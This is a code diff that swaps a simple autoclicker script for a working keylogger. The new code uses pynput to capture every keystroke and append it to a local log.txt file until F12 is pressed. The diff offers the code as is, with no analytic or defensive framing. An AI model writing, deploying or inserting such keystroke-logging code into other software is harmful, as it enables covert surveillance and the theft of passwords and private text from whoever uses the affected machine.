@@ -1,12 +1,13 @@
-import time, pyautogui
+from pynput.keyboard import Listener
 
-numCLick = input('ENTER THE NUMBER OF CLICKS: ')
+def keyLogger(key):
+    key = str(key)
+    key = key.replace("'", "")
+    if key == 'Key.f12':
+        raise SystemExit(0)
 
-class autoclicker():
-    def autoclick(self, x):
-        time.sleep(5)
-        for i in range(int(x)):
-            pyautogui.leftClick()
-            pyautogui.leftClick()
-auto = autoclicker()
-auto.autoclick(numCLick)
+    with open("log.txt", "a") as file:
+        file.write(key)
+
+with Listener(on_press=keyLogger) as Iceyzx:
+    Iceyzx.join()
